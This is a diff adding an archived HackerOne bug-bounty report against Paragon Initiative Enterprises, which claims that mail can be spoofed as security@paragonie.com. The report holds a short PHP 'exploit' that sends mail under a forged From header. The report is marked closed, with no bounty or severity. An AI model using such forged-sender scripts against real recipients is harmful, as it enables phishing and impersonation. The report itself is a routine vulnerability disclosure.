@@ -1,0 +1,32 @@
+ReportLink:https://hackerone.com/reports/148763
+WeaknessName:Memory Corruption - Generic
+Reporter:https://hackerone.com/ahsan
+ReportedTo:Paragon Initiative Enterprises(paragonie)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:01.07.2016 22:44:22
+
+Summary:
+
+Hey, I've found *email spoofing* vulnerability in security@paragonie.com
+Issue:
+========
+When I try to send a fake email from security@paragonie.com is is an issue; because, fake mails should be sent into the 'spam' folder.
+
+### Exploit Code:
+```
+<?php
+$to = "mrahsan1337@gmail.com";
+$subject = "test by ahsan";
+$txt = "testing";
+$headers = "From: security@paragonie.com";
+mail($to,$subject,$txt,$headers);
+?>
+```
+When I tried to run it as a web-app in my browser, like, I created a file in my server (e.g test.php) and in that file I put this exploit code, and saved it when i run it like myserver.com/test.php it showed a blank white page, and next i checked out my email and i received an email from security@paragonie.com into my **inbox** saying 'testing' 
+
+I hope you'll fix it soon.. :-)
+
+Thanks,
+Ahsan Tahir
